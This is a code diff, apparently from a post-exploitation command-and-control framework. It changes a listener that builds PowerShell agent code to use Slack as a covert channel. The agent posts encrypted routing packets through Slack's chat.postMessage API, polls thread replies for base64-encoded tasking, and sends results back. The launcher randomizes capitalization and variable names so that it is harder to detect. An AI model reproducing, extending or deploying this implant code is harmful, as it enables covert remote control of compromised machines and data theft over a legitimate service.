@@ -223,7 +223,7 @@ class Listener:
             staging_key = listener_options['StagingKey']['Value']
 
             if language.startswith("power"):
-                launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
+                launcher = ""#"$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
 
                 if safeChecks.lower() == 'true':
                     launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
@@ -431,30 +431,27 @@ class Listener:
             if language.lower() == 'powershell':
 
                 getTask = """
+                    function ConvertFrom-Json20([object] $item){ 
+                        add-type -assembly system.web.extensions
+                        $ps_js=new-object system.web.script.serialization.javascriptSerializer
+                        return ,$ps_js.DeserializeObject($item)
+                    }
+
+                    function Decode-Base64 {
+                        param($base64)
+                        return [convert]::FromBase64String($base64)
+                    }
+
+                    $Script:task_ts = $null;
                     $script:GetTask = {
 
-                        #write-host '[*] Getting tasks'
+                        write-host '[*] Getting tasks'
 
                         try {
 
                             $APIToken = '"""+ api_token +"""'
                             $Channel = '"""+ channel_id +"""'
                             $AgentID = '"""+ agent_id +"""'
-
-                            function ConvertFrom-Json20([object] $item){ 
-                                add-type -assembly system.web.extensions
-                                $ps_js=new-object system.web.script.serialization.javascriptSerializer
-                                return ,$ps_js.DeserializeObject($item)
-                            }
-
-                            function Decode-Base64 {
-                                param($base64)
-                                return [convert]::FromBase64String($base64)
-                            }
-
-                            # meta 'TASKING_REQUEST' : 4
-                            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
-                            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
                             # build the web request object
                             $"""+helpers.generate_random_script_var_name("wc")+""" = New-Object System.Net.WebClient
@@ -466,84 +463,54 @@ class Listener:
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = $Script:Proxy;
                             }
 
+                            # Look for reply to revious tasking message
+                            if($script:task_ts) {
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
+                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($script:task_ts)")
+                                $slack_response=ConvertFrom-Json20 $slack_response2;
+
+                                $replies = $slack_response["messages"] | select -skip 1;
+                                if($replies) {
+                                    $raw_base64 = (($replies | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
+                                    
+                                    #write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
+                                    
+                                    $result=Decode-Base64 $raw_base64;
+                                    if($result) {
+                                       # write-host "[*] cypher text decode from base64";
+                                    }
+
+                                    $result
+                                }
+                            }
+
+                            # meta 'TASKING_REQUEST' : 4
+                            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
+                            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
+
                             $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
                             $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
 
                             $RoutingPacket_base64 = [Convert]::ToBase64String($RoutingPacket)
 
                             try {
-                                # get a random posting URI
-                                $taskURI = $Script:TaskURIs | Get-Random
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
                                 $response = $"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.postMessage","POST","token=$($APIToken)&channel=$($Channel)&text=$([System.Net.WebUtility]::UrlEncode($RoutingPacket_base64))&username=$($AgentID):STAGED")
 
                                 # grab the timestamp from the sent message so we can track a response
                                 $slack_response = ConvertFrom-Json20 $response
-                                $current_ts = $slack_response["ts"]
+                                $Script:task_ts = $slack_response["ts"]
 
                             }
                             catch [System.Net.WebException]{$null}
-
-                            # wait for listener to respond before proceeding
-                            $timeout=0
-                            $message_present=$false
-                            while($timeout -lt 5) {
-
-
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded')
-                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($current_ts)")
-                                $slack_response2=ConvertFrom-Json20 $slack_response2
-
-                                # if no replies give the listener 5 seconds to post a reply else give up
-                                $replies = $slack_response2["messages"] | select -skip 1;
-
-                                #write-host "$(@($replies).count) replies and timeout is $timeout"
-                                if(([int]@($replies).count) -eq 0) {
-                                    $timeout++
-                                }else{
-                                    $timeout=0
-                                }
-
-                                $last_message = $slack_response2["messages"] | Select -Last 1;
-                                if($last_message["text"] -eq "-MESSAGE_END-") {
-                                        $timeout = 999
-                                        $message_present = $true
-                                }
-
-                                Start-Sleep -Seconds 1
-                            }
-
-                            if($message_present) {
-                                # listener has replied grab all replies
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
-                                $slack_response2=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/channels.replies","POST","token=$($APIToken)&channel=$($Channel)&thread_ts=$($current_ts)")
-                                $slack_response=ConvertFrom-Json20 $slack_response2;
-
-                                $replies = $slack_response["messages"] | select -skip 1;
-                                $raw_base64 = (($replies | %{ $_["text"] }) -join '').Replace('-MESSAGE_END-','')
-                                
-                                #write-host "[*] Base64 joined back together total length is $($raw_base64.length)";
-                                
-                                $result=Decode-Base64 $raw_base64;
-                                if($result) {
-                                   # write-host "[*] cypher text decode from base64";
-                                }
-
-                                $result
-                            }else{
-                                # delete message
-                                #$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add('Content-Type','application/x-www-form-urlencoded');
-                                #$delete_response=$"""+helpers.generate_random_script_var_name("wc")+""".UploadString("https://slack.com/api/chat.delete","POST","token=$($APIToken)&channel=$($Channel)&ts=$($current_ts)")
-                            }
-                            
                         }
                         catch [Net.WebException] {
                             write-host $_
                             $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                            #if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                 # restart key negotiation
-                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
+                            #    Start-Negotiate -S "$ser" -SK $SK -UA $ua
+                            #}
                         }
                     }
                 """
@@ -558,12 +525,6 @@ class Listener:
                             $APIToken = '"""+ api_token +"""'
                             $Channel = '"""+ channel_id +"""'
                             $AgentID = '"""+ agent_id +"""'
-
-                            function ConvertFrom-Json20([object] $item){ 
-                                add-type -assembly system.web.extensions
-                                $ps_js=new-object system.web.script.serialization.javascriptSerializer
-                                return ,$ps_js.DeserializeObject($item)
-                            }
 
                             $encBytes = encrypt-bytes $packets
                             $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
